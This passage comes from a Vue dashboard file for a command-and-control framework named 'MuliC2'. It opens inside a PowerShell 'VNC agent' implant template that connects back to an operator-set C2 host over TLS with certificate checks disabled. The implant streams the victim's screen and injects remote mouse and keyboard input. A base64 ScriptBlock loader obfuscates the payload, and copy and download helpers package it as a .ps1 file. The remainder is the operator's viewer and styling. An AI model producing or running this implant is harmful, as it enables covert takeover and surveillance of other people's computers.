                    0 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, $px, $py, 0, 0); Write-Host "[+] Left mouse button down" -ForegroundColor Green }
                    2 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTDOWN, $px, $py, 0, 0); Write-Host "[+] Right mouse button down" -ForegroundColor Green }
                    1 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_MIDDLEDOWN, $px, $py, 0, 0); Write-Host "[+] Middle mouse button down" -ForegroundColor Green }
                }
            }
            'mouseup' {
                switch ($button) {
                    0 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, $px, $py, 0, 0); Write-Host "[+] Left mouse button up" -ForegroundColor Green }
                    2 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTUP, $px, $py, 0, 0); Write-Host "[+] Right mouse button up" -ForegroundColor Green }
                    1 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_MIDDLEUP, $px, $py, 0, 0); Write-Host "[+] Middle mouse button up" -ForegroundColor Green }
                }
            }
            'click' {
                switch ($button) {
                    0 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, $px, $py, 0, 0); Start-Sleep -Milliseconds 50; [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, $px, $py, 0, 0); Write-Host "[+] Left click executed" -ForegroundColor Green }
                    2 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTDOWN, $px, $py, 0, 0); Start-Sleep -Milliseconds 50; [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTUP, $px, $py, 0, 0); Write-Host "[+] Right click executed" -ForegroundColor Green }
                }
            }
            'dblclick' {
                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, $px, $py, 0, 0)
                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, $px, $py, 0, 0)
                Start-Sleep -Milliseconds 50
                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, $px, $py, 0, 0)
                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, $px, $py, 0, 0)
                Write-Host "[+] Double click executed" -ForegroundColor Green
            }
        }
    } catch {
        Write-Host "[!] Mouse event simulation failed: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Invoke-KeyboardEvent {
    param(
        [string]$event,
        [string]$key,
        [string]$code,
        [int]$keyCode,
        [bool]$ctrlKey = $false,
        [bool]$shiftKey = $false,
        [bool]$altKey = $false
    )
    try {
        Write-Host "[*] Keyboard event: $event - Key: '$key' Code: '$code' KeyCode: $keyCode" -ForegroundColor Cyan
        $vkCode = 0
        switch ($key) {
            'Enter' { $vkCode = 0x0D }
            'Escape' { $vkCode = 0x1B }
            'Backspace' { $vkCode = 0x08 }
            'Tab' { $vkCode = 0x09 }
            'Delete' { $vkCode = 0x2E }
            'ArrowUp' { $vkCode = 0x26 }
            'ArrowDown' { $vkCode = 0x28 }
            'ArrowLeft' { $vkCode = 0x25 }
            'ArrowRight' { $vkCode = 0x27 }
            'Home' { $vkCode = 0x24 }
            'End' { $vkCode = 0x23 }
            'PageUp' { $vkCode = 0x21 }
            'PageDown' { $vkCode = 0x22 }
            'Insert' { $vkCode = 0x2D }
            'F1' { $vkCode = 0x70 }
            'F2' { $vkCode = 0x71 }
            'F3' { $vkCode = 0x72 }
            'F4' { $vkCode = 0x73 }
            'F5' { $vkCode = 0x74 }
            'F6' { $vkCode = 0x75 }
            'F7' { $vkCode = 0x76 }
            'F8' { $vkCode = 0x77 }
            'F9' { $vkCode = 0x78 }
            'F10' { $vkCode = 0x79 }
            'F11' { $vkCode = 0x7A }
            'F12' { $vkCode = 0x7B }
            'Control' { $vkCode = 0x11 }
            'Alt' { $vkCode = 0x12 }
            'Shift' { $vkCode = 0x10 }
            default {
                if ($key.Length -eq 1) {
                    $vkCode = [Win32API]::VkKeyScan($key[0]) -band 0xFF
                } elseif ($keyCode -ne 0) {
                    $vkCode = $keyCode
                }
            }
        }
        if ($vkCode -ne 0) {
            if ($event -eq 'keydown') {
                [Win32API]::keybd_event([byte]$vkCode, 0, 0, [UIntPtr]::Zero)
                Write-Host "[+] Key down: $key (VK: $vkCode)" -ForegroundColor Green
            } elseif ($event -eq 'keyup') {
                [Win32API]::keybd_event([byte]$vkCode, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
                Write-Host "[+] Key up: $key (VK: $vkCode)" -ForegroundColor Green
            }
        } else {
            if ($key.Length -eq 1) {
                [System.Windows.Forms.SendKeys]::SendWait($key)
                Write-Host "[+] Character sent via SendKeys: $key" -ForegroundColor Green
            } else {
                Write-Host "[!] Could not simulate key: $key" -ForegroundColor Red
            }
        }
    } catch {
        Write-Host "[!] Keyboard event simulation failed: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# --- End Input Event Simulation Functions ---

# Global variables for cleanup
$global:tcpClient = $null
$global:sslStream = $null
$global:isRunning = $true
$global:cleanupInProgress = $false
$global:inputJob = $null

try {
    Write-Host "[*] Connecting to MuliC2 server at $C2Host`:$C2Port..." -ForegroundColor Cyan
    $global:tcpClient = New-Object System.Net.Sockets.TcpClient
    $asyncResult = $global:tcpClient.BeginConnect($C2Host, $C2Port, $null, $null)
    $waitSuccess = $asyncResult.AsyncWaitHandle.WaitOne(10000, $false)
    if (-not $waitSuccess -or -not $global:tcpClient.Connected) {
        throw "Connection to $C2Host`:$C2Port failed or timed out"
    }
    $global:tcpClient.EndConnect($asyncResult)
    Write-Host "[+] TCP connection established" -ForegroundColor Green
    $socket = $global:tcpClient.Client
    $socket.ReceiveTimeout = -1
    $socket.SendTimeout = 30000
    $socket.NoDelay = $true
    $global:sslStream = New-Object System.Net.Security.SslStream(
        $global:tcpClient.GetStream(),
        $false,
        ([System.Net.Security.RemoteCertificateValidationCallback] { param($sender, $certificate, $chain, $sslPolicyErrors) return $true })
    )
    try {
        $global:sslStream.AuthenticateAsClient($C2Host)
    } catch {
        throw "SSL authentication failed: $($_.Exception.Message)"
    }
    if (-not $global:sslStream.IsAuthenticated) {
        throw "SSL authentication failed - stream not authenticated"
    }
    Write-Host "[+] SSL connection established and authenticated" -ForegroundColor Green
    Write-Host "[*] Starting screen capture... (Press CTRL+C to exit gracefully)" -ForegroundColor Cyan
    Write-Host "[*] Capturing 200x150 resolution at 5 FPS" -ForegroundColor Gray

    # --- Start Input Event Listener Job ---
    $inputJob = Start-Job -ScriptBlock {
        param($sslStream)
        Write-Host "[*] Input event listener job started" -ForegroundColor Magenta
        while ($true) {
            try {
                $lengthBytes = New-Object byte[] 4
                $bytesRead = $sslStream.Read($lengthBytes, 0, 4)
                if ($bytesRead -ne 4) { continue }
                $msgLength = [BitConverter]::ToInt32($lengthBytes, 0)
                if ($msgLength -le 0 -or $msgLength -gt 4096) { continue }
                $msgBytes = New-Object byte[] $msgLength
                $read = 0
                while ($read -lt $msgLength) {
                    $n = $sslStream.Read($msgBytes, $read, $msgLength - $read)
                    if ($n -le 0) { break }
                    $read += $n
                }
                $json = [System.Text.Encoding]::UTF8.GetString($msgBytes, 0, $msgLength)
                Write-Host "[*] Received input event: $json" -ForegroundColor Cyan
                $event = $null
                try { $event = $json | ConvertFrom-Json } catch {}
                if ($event) {
                    if ($event.type -eq 'mouse') {
                        Invoke-MouseEvent $event.event $event.x $event.y $event.button
                    } elseif ($event.type -eq 'keyboard') {
                        Invoke-KeyboardEvent $event.event $event.key $event.code $event.keyCode $event.ctrlKey $event.shiftKey $event.altKey
                    } elseif ($event.type -eq 'test' -and $event.event -eq 'show_messagebox') {
                        try {
                            Add-Type -AssemblyName System.Windows.Forms
                            [System.Windows.Forms.MessageBox]::Show("Remote input test successful!", "MuliC2 VNC Agent")
                            Write-Host "[*] MessageBox should be visible now." -ForegroundColor Green
                        } catch {
                            Write-Host "[!] Failed to show MessageBox: $($_.Exception.Message)" -ForegroundColor Red
                        }
                    }
                }
            } catch {
                Write-Host "[!] Exception in input event listener: $($_.Exception.Message)" -ForegroundColor Red
            }
            Start-Sleep -Milliseconds 10
        }
    } -ArgumentList $global:sslStream
    # --- End Input Event Listener Job ---

    # ... (rest of screen capture loop) ...
} catch {
    Write-Host "[!] Connection error: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "[!] Make sure the MuliC2 listener is running on $C2Host`:$C2Port" -ForegroundColor Red
} finally {
    # Final cleanup
    if (-not $global:cleanupInProgress) {
        Invoke-GracefulCleanup $true
    }
    
    # Remove event handlers
    try {
        if ($exitHandler) {
            Unregister-Event -SourceIdentifier "PowerShell.Exiting" -Force -ErrorAction SilentlyContinue
        }
        if ($cancelHandler) {
            [System.Console]::remove_CancelKeyPress($cancelHandler)
        }
    } catch {}
    
    Write-Host "[*] MuliC2 VNC agent terminated" -ForegroundColor Yellow
}
`;
    
    // Apply loader if enabled
    if (vncForm.value.useLoader) {
      payload = applyVncLoader(payload)
    }
    
    generatedVncPayload.value = payload
    ElMessage.success('MuliC2 VNC payload generated successfully!')
  } catch (error) {
    ElMessage.error('Failed to generate VNC payload: ' + error)
  } finally {
    generatingVnc.value = false
  }
}

const applyVncLoader = (inputScript: string): string => {
  // Use UTF-8 encoding instead of Unicode to avoid encoding issues
  const encodedScript = btoa(unescape(encodeURIComponent(inputScript)))
  const wrapperLoaderForPayload = `$enc = [System.Text.Encoding]::UTF8
$decoded = $enc.GetString([Convert]::FromBase64String('${encodedScript}'))
$scriptBlock = [ScriptBlock]::Create($decoded)
& $scriptBlock`
  
  return wrapperLoaderForPayload
}

// VNC Control Functions
const startVncViewer = async () => {
  try {
    vncViewerActive.value = true
    ElMessage.success('VNC viewer started')
    await connectToVNCStream()
    setTimeout(() => {
      showInputFeedback('Click on the video to focus, then click and type to interact')
    }, 1000)
  } catch (error) {
    console.error('Failed to start VNC viewer:', error)
    ElMessage.error('Failed to start VNC viewer')
    vncViewerActive.value = false
  }
}

// Connect to VNC stream from C2 server
const connectToVNCStream = async () => {
  try {

    // First check for active VNC connections
    const response = await authenticatedFetch('/api/vnc/connections')
        if (!response.ok) {
      throw new Error(`Failed to get VNC connections: ${response.status}`)
    }
    
    const data = await response.json()
    if (data.connections && data.connections.length > 0) {
      // Update connection info
      const connection = data.connections[0]
      vncConnected.value = true
      vncAgentInfo.value = {
        hostname: connection.hostname || 'Unknown',
        ip: connection.agent_ip || 'Unknown',
        resolution: connection.resolution || '200x150',
        fps: connection.fps?.toString() || '5'
      }
      
      // Start receiving frames
      startVNCStream()
    } else {
      ElMessage.warning('No VNC agents currently connected')
      vncConnected.value = false
    }
    
  } catch (error) {
    console.error('Failed to connect to VNC:', error)
    ElMessage.error('Failed to connect to VNC stream')
    vncConnected.value = false
  }
}

// Start receiving VNC frames via Server-Sent Events
const startVNCStream = () => {
  const token = localStorage.getItem('auth_token')
  // Create EventSource with token in URL (EventSource doesn't support custom headers)
  const eventSource = new EventSource(`${API_BASE_URL}/api/vnc/stream?token=${token}`)
  eventSource.onmessage = (event) => {
    try {
      if (!event.data) return;
      const obj = JSON.parse(event.data);
      if (!obj.image_data) {
        // Not a VNC frame, maybe a status or control message
        console.log('Received non-frame message:', obj);
        return;
      }
      const frame = obj;
      (window as any).lastVncFrame = frame;
      // Inline processVNCFrame logic
      vncFrameCount.value++;
      const currentTime = Date.now();
      const lastFrameTime = (window as any).lastFrameTime || currentTime;
      vncCurrentFps.value = Math.floor(1000 / (currentTime - lastFrameTime));
      ;(window as any).lastFrameTime = currentTime;
      // Render frame to canvas
      if (vncCanvas.value && frame.image_data) {
        try {
          const canvas = vncCanvas.value;
          const ctx = canvas.getContext('2d');
          if (ctx) {
            // Create image from base64 data
            const img = new Image();
            img.onload = () => {
              // Clear canvas and draw new frame
              ctx.clearRect(0, 0, canvas.width, canvas.height);
              ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
            };
            // Handle both base64 with and without data URL prefix
            const imageData = frame.image_data.startsWith('data:') 
              ? frame.image_data 
              : `data:image/jpeg;base64,${frame.image_data}`;
            img.src = imageData;
          }
        } catch (error) {
          console.error('Error rendering VNC frame:', error);
        }
      }
      console.log(`Rendered VNC frame: ${frame.size || 'unknown'} bytes from ${frame.connection_id || 'unknown'}`);
      // --- NEW: Open VNC input WebSocket after first valid frame with connection_id ---
      if (!vncInputSocket && frame.connection_id) {
        vncInputConnectionId = frame.connection_id;
        openVncInputSocket();
        attachVncInputListeners();
      }
    } catch (error) {
      console.error('Error processing VNC frame:', error, event.data);
    }
  }
  eventSource.onerror = (error) => {
    console.error('VNC stream error:', error)
    ElMessage.error('VNC stream connection lost')
    eventSource.close()
  }
  // Store event source for cleanup
  ;(window as any).vncEventSource = eventSource
}

const stopVncViewer = () => {
  vncViewerActive.value = false
  ElMessage.success('VNC viewer stopped')
  
  // Close VNC stream
  if ((window as any).vncEventSource) {
    (window as any).vncEventSource.close()
    ;(window as any).vncEventSource = null
  }
  
  // Reset VNC state
  vncConnected.value = false
  vncFrameCount.value = 0
  vncCurrentFps.value = 0
  vncAgentInfo.value = {
    hostname: '',
    ip: '',
    resolution: '200x150',
    fps: '5'
  }
}

const captureScreenshot = () => {
  if (vncCanvas.value) {
    const link = document.createElement('a')
    link.download = `vnc-screenshot-${Date.now()}.png`
    link.href = vncCanvas.value.toDataURL()
    link.click()
    ElMessage.success('Screenshot captured')
  }
}

const toggleFullscreen = () => {
  if (vncCanvas.value) {
    if (document.fullscreenElement) {
      document.exitFullscreen()
    } else {
      vncCanvas.value.requestFullscreen()
    }
  }
}

const clearVncForm = () => {
  vncForm.value = {
    lhost: '',
    c2Port: '',
    payloadType: 'powershell',
    useLoader: true
  }
  selectedListenerId.value = ''
  generatedVncPayload.value = ''
}

const autoFillVncFromConfig = () => {
  // Get the first active HTTPS listener
  const activeListener = listeners.value.find(l => l.isActive && l.useTLS)
  
  if (activeListener) {
    selectedListenerId.value = activeListener.id
    updateVncFormFromListener()
    ElMessage.success(`Auto-selected listener: ${activeListener.name} (${activeListener.host}:${activeListener.port})`)
  } else {
    ElMessage.warning('No active HTTPS listeners found. Please start an HTTPS listener first.')
  }
}

const copyVncPayload = async () => {
  try {
    await navigator.clipboard.writeText(generatedVncPayload.value)
    ElMessage.success('VNC payload copied to clipboard')
  } catch (error) {
    ElMessage.error('Failed to copy VNC payload')
  }
}

const downloadVncPayload = () => {
  const blob = new Blob([generatedVncPayload.value], { type: 'text/plain' })
  const url = URL.createObjectURL(blob)
  const a = document.createElement('a')
  a.href = url
  const filename = selectedListener.value 
    ? `vnc_payload_${selectedListener.value.host}_${selectedListener.value.port}.ps1`
    : 'vnc_payload.ps1'
  a.download = filename
  document.body.appendChild(a)
  a.click()
  document.body.removeChild(a)
  URL.revokeObjectURL(url)
  ElMessage.success('VNC payload downloaded')
}





// Utility functions
const getImplantTypeColor = (type: string) => {
  switch (type) {
    case 'agent': return 'primary'
    case 'beacon': return 'success'
    case 'vnc': return 'warning'
    default: return 'info'
  }
}

const getTaskStatusColor = (status: string) => {
  switch (status) {
    case 'completed': return 'success'
    case 'running': return 'warning'
    case 'queued': return 'info'
    case 'failed': return 'danger'
    case 'cancelled': return 'info'
    default: return 'info'
  }
}

// Initialize dashboard
onMounted(() => {
  console.log('[DEBUG] Dashboard.vue mounted')
  updateStats()
  loadDashboardData()
  loadProfiles() // Load profiles on mount
})

// Watch for listener selection changes
watch(selectedListenerId, (newId: string) => {
  if (newId) {
    updateVncFormFromListener()
  }
})

// Update dashboard statistics
const updateStats = () => {
  stats.value.totalImplants = implants.value.length
  stats.value.activeListeners = listeners.value.filter(l => l.isActive).length
  stats.value.runningTasks = tasks.value.filter(t => t.status === 'running').length
  
  const onlineImplants = implants.value.filter(i => i.status === 'online')
  if (onlineImplants.length > 0) {
    stats.value.lastCheckin = onlineImplants[0].lastCheckin
  }
}

// Load dashboard data from backend
const loadDashboardData = async () => {
  try {
    // Load listeners from API
    const listenersData = await authenticatedFetch('/api/listeners')
    if (listenersData.ok) {
      const data = await listenersData.json()
      listeners.value = data.listeners || []
      // Update C2 port from active TLS listener if available
      setPortFromActiveListener()
      // Auto-select first active HTTPS listener if none selected
      if (!selectedListenerId.value && activeHTTPSListeners.value.length > 0) {
        selectedListenerId.value = activeHTTPSListeners.value[0].id
        updateC2PortFromSelectedListener()
      }
    }
    
    // TODO: Replace with actual API calls for other data
    // const implantsData = await authenticatedFetch('/api/implants')
    // const tasksData = await authenticatedFetch('/api/tasks')
    
    // Update stats with real data
    updateStats()
  } catch (error) {
    console.error('Failed to load dashboard data:', error)
  }
}

const activeTLSProfile = computed<Profile | undefined>(() => {
  return (
    availableProfiles.value.find(p => p.isActive && p.useTLS) ||
    availableProfiles.value.find(p => p.useTLS) ||
    availableProfiles.value[0]
  )
})

const setPortFromActiveProfile = () => {
  if (activeTLSProfile.value) {
    vncForm.value.c2Port = String(activeTLSProfile.value.port)
  }
}

// Prefer the actual active TLS listener from backend state
const activeTLSListener = computed<Listener | undefined>(() => {
  return listeners.value.find(l => l.isActive && l.useTLS)
})

const setPortFromActiveListener = () => {
  if (activeTLSListener.value) {
    vncForm.value.c2Port = String(activeTLSListener.value.port)
  }
}

const activeHTTPSListeners = computed<Listener[]>(() => {
  return listeners.value.filter(l => l.isActive && l.useTLS)
})

const selectedListener = computed<Listener | undefined>(() => {
  return listeners.value.find(l => l.id === selectedListenerId.value)
})

const updateVncFormFromListener = () => {
  if (selectedListener.value) {
    vncForm.value.c2Port = String(selectedListener.value.port)
    const host = selectedListener.value.host || ''
    const isBindAll = host === '0.0.0.0' || host === '::' || host === '::0' || host === '0:0:0:0'
    vncForm.value.lhost = isBindAll ? (window.location.hostname || 'localhost') : host
  }
}

const getCurrentHostname = () => {
  return window.location.hostname || 'localhost'
}

const updateC2PortFromSelectedListener = () => {
  if (selectedListener.value) {
    vncForm.value.c2Port = String(selectedListener.value.port)
    const host = selectedListener.value.host || ''
    const isBindAll = host === '0.0.0.0' || host === '::' || host === '::0' || host === '0:0:0:0'
    vncForm.value.lhost = isBindAll ? getCurrentHostname() : host
  }
}

const refreshListeners = async () => {
  try {
    await loadDashboardData()
    ElMessage.success('Listeners refreshed')
  } catch (error) {
    console.error('Failed to refresh listeners:', error)
    ElMessage.error('Failed to refresh listeners')
  }
}

// VNC Input WebSocket
let vncInputSocket: WebSocket | null = null
let vncInputConnectionId: string | null = null

function getVncInputConnectionId() {
  // Use the current VNC agent info's connection_id if available
  // This should match the backend's VNC connection ID
  if ((window as any).lastVncFrame && (window as any).lastVncFrame.connection_id) {
    return (window as any).lastVncFrame.connection_id
  }
  // No fallback to vncAgentInfo, as it does not have connection_id
  return null
}

function openVncInputSocket() {
  if (vncInputSocket) return
  const token = localStorage.getItem('auth_token')
  // Try to get the connection_id from the last VNC frame or agent info
  vncInputConnectionId = getVncInputConnectionId()
  if (!token || !vncInputConnectionId) return
  const wsUrl = `${API_BASE_URL.replace('http', 'ws')}/api/vnc/input/ws?token=${token}&connection_id=${vncInputConnectionId}`
  vncInputSocket = new WebSocket(wsUrl)
  vncInputSocket.onopen = () => {
    console.log('VNC input WebSocket connected')
  }
  vncInputSocket.onclose = () => {
    console.log('VNC input WebSocket closed')
    vncInputSocket = null
  }
  vncInputSocket.onerror = (e) => {
    console.error('VNC input WebSocket error', e)
    vncInputSocket = null
  }
}

function closeVncInputSocket() {
  if (vncInputSocket) {
    vncInputSocket.close()
    vncInputSocket = null
  }
}

function sendVncInputEvent(event: any) {
  if (!vncInputSocket || vncInputSocket.readyState !== 1) return
  console.log('[DEBUG] sendVncInputEvent called:', event)
  vncInputSocket.send(JSON.stringify(event))
}

// 3. NEW: Add visual feedback system
const inputFeedback = ref('')
const inputFeedbackVisible = ref(false)
let feedbackTimeout: number | null = null

function showInputFeedback(message: string) {
  inputFeedback.value = message
  inputFeedbackVisible.value = true
  if (feedbackTimeout) {
    clearTimeout(feedbackTimeout)
  }
  feedbackTimeout = setTimeout(() => {
    inputFeedbackVisible.value = false
  }, 2000)
}

// 1. UPDATE: Enhanced mouse event handler
function handleVncMouseEvent(e: MouseEvent) {
  if (!vncViewerActive.value || !vncConnected.value) return
  const canvas = vncCanvas.value
  if (!canvas) return
  if (e.type === 'mousemove') {
    return // Don't send mouse movement events
  }
  e.preventDefault()
  e.stopPropagation()
  const rect = canvas.getBoundingClientRect()
  const x = ((e.clientX - rect.left) / rect.width)
  const y = ((e.clientY - rect.top) / rect.height)
  const event = {
    type: 'mouse',
    event: e.type,
    x,
    y,
    button: e.button,
    buttons: e.buttons,
    ctrlKey: e.ctrlKey,
    shiftKey: e.shiftKey,
    altKey: e.altKey,
    metaKey: e.metaKey,
    connection_id: vncInputConnectionId
  }
  console.log('🖱️ Sending VNC mouse event:', event)
  showInputFeedback(`Mouse ${e.type} at (${Math.round(x*100)}%, ${Math.round(y*100)}%)`)
  sendVncInputEvent(event)
}

// 2. UPDATE: Enhanced keyboard event handler
function handleVncKeyboardEvent(e: KeyboardEvent) {
  if (!vncViewerActive.value || !vncConnected.value) return
  if ((e.ctrlKey && (e.key === 'r' || e.key === 'R')) || e.key === 'F5') {
    return // Allow browser refresh
  }
  e.preventDefault()
  e.stopPropagation()
  const event = {
    type: 'keyboard',
    event: e.type,
    key: e.key,
    code: e.code,
    keyCode: e.keyCode,
    ctrlKey: e.ctrlKey,
    shiftKey: e.shiftKey,
    altKey: e.altKey,
    metaKey: e.metaKey,
    connection_id: vncInputConnectionId
  }
  console.log('⌨️ Sending VNC keyboard event:', event)
  showInputFeedback(`Key ${e.type}: ${e.key}`)
  sendVncInputEvent(event)
}

// 4. UPDATE: Enhanced event listener attachment
function attachVncInputListeners() {
  const canvas = vncCanvas.value
  if (!canvas) return
  canvas.addEventListener('mousedown', handleVncMouseEvent)
  canvas.addEventListener('mouseup', handleVncMouseEvent)
  canvas.addEventListener('click', handleVncMouseEvent)
  canvas.addEventListener('dblclick', handleVncMouseEvent)
  canvas.addEventListener('wheel', handleVncWheelEvent)
  canvas.setAttribute('tabindex', '0')
  canvas.style.outline = 'none'
  canvas.focus()
  window.addEventListener('keydown', handleVncKeyboardEvent)
  window.addEventListener('keyup', handleVncKeyboardEvent)
  canvas.addEventListener('focus', () => {
    vncDebug.value.canvasFocused = true
    console.log('🎯 VNC canvas focused - keyboard input ready')
    showInputFeedback('Canvas focused - keyboard input ready')
  })
  vncDebug.value.listenerAttached = true
  console.log('🎮 VNC input listeners attached (mouse clicks & keyboard only)')
  showInputFeedback('Input listeners active - click and type to interact')
}

// 5. UPDATE: Enhanced detachment function
function detachVncInputListeners() {
  const canvas = vncCanvas.value
  if (!canvas) return
  canvas.removeEventListener('mousedown', handleVncMouseEvent)
  canvas.removeEventListener('mouseup', handleVncMouseEvent)
  canvas.removeEventListener('click', handleVncMouseEvent)
  canvas.removeEventListener('dblclick', handleVncMouseEvent)
  canvas.removeEventListener('wheel', handleVncWheelEvent)
  window.removeEventListener('keydown', handleVncKeyboardEvent)
  window.removeEventListener('keyup', handleVncKeyboardEvent)
  vncDebug.value.listenerAttached = false
  vncDebug.value.canvasFocused = false
  if (feedbackTimeout) {
    clearTimeout(feedbackTimeout)
  }
  inputFeedbackVisible.value = false
  console.log('🚫 VNC input listeners detached')
}

// 6. NEW: Enhanced CTRL+ALT+DEL function
function sendCtrlAltDel() {
  if (!vncViewerActive.value || !vncConnected.value) return
  const event = {
    type: 'keyboard',
    event: 'ctrlaltdel',
    connection_id: vncInputConnectionId
  }
  console.log('🔐 Sending CTRL+ALT+DELETE')
  sendVncInputEvent(event)
  showInputFeedback('CTRL+ALT+DELETE sent')
  ElMessage.success('Sent CTRL+ALT+DELETE')
}

// 7. NEW: Enhanced MessageBox test function
function sendShowMessageBox() {
  if (!vncViewerActive.value || !vncConnected.value) return
  const event = {
    type: 'test',
    event: 'show_messagebox',
    connection_id: vncInputConnectionId
  }
  console.log('💬 Sending MessageBox test')
  sendVncInputEvent(event)
  showInputFeedback('MessageBox test sent')
  ElMessage.success('MessageBox test sent - check remote screen')
}

watch([vncViewerActive, vncConnected], ([active, connected]) => {
  if (active && connected) {
    // Wait for the first VNC frame to get the connection_id
    setTimeout(() => {
      vncInputConnectionId = getVncInputConnectionId()
      openVncInputSocket()
      attachVncInputListeners()
      vncDebug.value.agentHeartbeat = 'ready'
    }, 500)
  } else {
    detachVncInputListeners()
    closeVncInputSocket()
    vncDebug.value.agentHeartbeat = 'not ready'
  }
})

onUnmounted(() => {
  detachVncInputListeners()
  closeVncInputSocket()
})

function handleVncWheelEvent(e: WheelEvent) {
  if (!vncViewerActive.value || !vncConnected.value) return
  const canvas = vncCanvas.value
  if (!canvas) return
  const rect = canvas.getBoundingClientRect()
  const x = ((e.clientX - rect.left) / rect.width)
  const y = ((e.clientY - rect.top) / rect.height)
  const event = {
    type: 'mouse',
    event: 'wheel',
    x,
    y,
    deltaX: e.deltaX,
    deltaY: e.deltaY,
    deltaZ: e.deltaZ,
    ctrlKey: e.ctrlKey,
    shiftKey: e.shiftKey,
    altKey: e.altKey,
    metaKey: e.metaKey,
    connection_id: vncInputConnectionId
  }
  sendVncInputEvent(event)
}

window.addEventListener('error', function(event) {
  vncDebug.value.lastError = '[GLOBAL ERROR] ' + (event.error || event.message)
  console.error('[GLOBAL ERROR]', event.error || event.message)
})

// Add VNC Debug Panel state
const debugMode = ref(true)
const vncDebug = ref({
  listenerAttached: false,
  canvasFocused: false,
  wsStatus: 'disconnected',
  lastInputEvent: null as any,
  lastError: '',
  agentHeartbeat: '',
  lastConnectionId: '',
})

// Add self-test state
const selfTestStatus = ref('idle') // idle | running | passed | failed
let selfTestTimeout: number | null = null

function runVncSelfTest() {
  if (!vncInputSocket || vncInputSocket.readyState !== 1) {
    selfTestStatus.value = 'failed'
    vncDebug.value.lastError = 'Self-Test: Input WebSocket not open'
    return
  }
  selfTestStatus.value = 'running'
  vncDebug.value.lastError = ''
  const testEvent = {
    type: 'test',
    event: 'selftest',
    connection_id: vncInputConnectionId,
    timestamp: Date.now(),
    nonce: Math.random().toString(36).slice(2)
  }
  vncDebug.value.lastInputEvent = testEvent
  vncInputSocket.send(JSON.stringify(testEvent))
  // Wait for confirmation (echo or response)
  if (selfTestTimeout) clearTimeout(selfTestTimeout)
  selfTestTimeout = setTimeout(() => {
    if (selfTestStatus.value === 'running') {
      selfTestStatus.value = 'failed'
      vncDebug.value.lastError = 'Self-Test: No confirmation received from agent'
    }
  }, 3000)
}
// Patch input WebSocket to listen for self-test confirmation
document.addEventListener('DOMContentLoaded', () => {
  if (vncInputSocket) {
    vncInputSocket.onmessage = (msg) => {
      try {
        const data = JSON.parse(msg.data)
        if (data.type === 'test' && data.event === 'selftest-confirm') {
          selfTestStatus.value = 'passed'
          if (selfTestTimeout) clearTimeout(selfTestTimeout)
        }
      } catch {}
    }
  }
})
// Add Self-Test button to the debug panel in the template
</script>

<style scoped lang="scss">
.dashboard {
  padding: 20px;
  background: var(--primary-black);
  color: var(--text-white);
  min-height: 100%;
}

.overview-panel {
  margin-bottom: 30px;
  
  .panel-title {
    color: var(--text-white);
    margin: 0 0 20px 0;
    font-size: 24px;
    font-weight: 600;
  }
  
  .stats-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 20px;
    
    .stat-card {
      background: var(--secondary-black);
      border: 1px solid var(--border-color);
      border-radius: 8px;
      padding: 20px;
      display: flex;
      align-items: center;
      
      .stat-icon {
        margin-right: 20px;
        padding: 15px;
        background: rgba(255, 255, 255, 0.1);
        border-radius: 8px;
      }
      
      .stat-content {
        .stat-number {
          font-size: 28px;
          font-weight: bold;
          color: var(--text-white);
          margin-bottom: 5px;
        }

        .stat-label {
          color: var(--text-gray);
          font-size: 14px;
        }
      }
    }
  }
}

.dashboard-tabs {
  background: var(--secondary-black);
  border-radius: 8px;
  padding: 20px;
  
  :deep(.el-tabs__header) {
    margin-bottom: 20px;
  }
  
  :deep(.el-tabs__item) {
    color: var(--text-gray);
    
    &.is-active {
      color: var(--primary-color);
    }
  }
}

.panel-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
  
  h3 {
    color: var(--text-white);
    margin: 0;
    font-size: 18px;
    font-weight: 600;
  }
  
  .task-controls {
    display: flex;
    align-items: center;
  }
}

.placeholder-content {
  text-align: center;
  padding: 60px 20px;
  color: var(--text-gray);
  
  h3 {
    color: var(--text-white);
    margin: 20px 0 15px 0;
  }
  
  ul {
    text-align: left;
    max-width: 400px;
    margin: 20px auto;
    
    li {
      margin-bottom: 8px;
    }
  }
}



// Responsive design
@media (max-width: 768px) {
  .dashboard {
    padding: 10px;
  }
  
  .stats-grid {
    grid-template-columns: 1fr;
  }
  
  .panel-header {
    flex-direction: column;
    align-items: flex-start;
    gap: 15px;
  }
}

/* Fix text colors for all panels */
.implants-panel,
.tasks-panel,
.listeners-panel,
.agents-panel,
.overview-panel {
  color: var(--text-white);
}

/* Ensure all text in panels is visible */
.panel-header,
.panel-header h3,
.panel-header p,
.panel-header span,
.panel-header div {
  color: var(--text-white) !important;
}

/* Fix specific panel content */
.listeners-panel,
.implants-panel,
.tasks-panel {
  background: var(--secondary-black);
  border-radius: 8px;
  padding: 20px;
  border: 1px solid var(--border-color);
}

/* Panel header styling */
.panel-header {
  border-bottom: 1px solid var(--border-color);
  padding-bottom: 15px;
  margin-bottom: 25px;
}

/* Fix table content visibility */
:deep(.el-table) {
  background: transparent !important;
  color: var(--text-white) !important;
}

:deep(.el-table__header) {
  background: var(--primary-black) !important;
}

:deep(.el-table__header th) {
  background: var(--primary-black) !important;
  color: var(--text-white) !important;
  border-bottom: 1px solid var(--border-color) !important;
}

:deep(.el-table__body) {
  background: transparent !important;
}

